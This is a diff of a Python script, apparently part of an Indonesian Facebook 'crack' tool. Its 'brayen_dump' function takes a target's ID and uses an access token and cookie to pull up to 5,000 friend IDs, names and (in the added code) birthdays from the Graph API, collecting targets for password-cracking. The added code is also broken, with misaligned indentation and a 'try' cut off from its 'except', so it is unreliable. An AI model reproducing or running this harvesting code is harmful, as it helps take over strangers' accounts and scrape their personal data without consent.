@@ -672,18 +672,16 @@ def brayen_dump():
 	cetak(panel('\t            [bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,style='bold white'))
 	pil = input(f' [+] Masukan ID Target : ')
 	try:
-		koH = requests.get('https://graph.facebook.com/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': kukis}).json()
-		for pi in koH['friends']['data']:
-			try:id.append(pi['id']+'|'+pi['name'])
-			except:continue
-		print(f' [+] Total ID Yang Terkumpul : {h}'+str(len(id)))
-		setting()
-	except requests.exceptions.ConnectionError:
-		print(' [+] Internet Lu Gak Ada Anjing')
-		exit()
-	except (KeyError,IOError):
-		print(' [+] Pertemanan Tidak Publick Atau Cookie And Token Anda Busuk')
-		exit()
+		params = {
+			"access_token": token, 
+			"fields": "name,friends.fields(id,name,birthday)"
+			}
+			b = ses.get("https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
+			for c in b["friends"]["data"]:
+				id.append(c["id"]+"|"+c["name"])
+			print('>> Total Idz : {}'.format(len(id)));setting()
+		except Exception as e:
+			print(e)
 #-------------------[ CRACK-PUBLIK ]----------------#
 def dump_massal():
 	try:
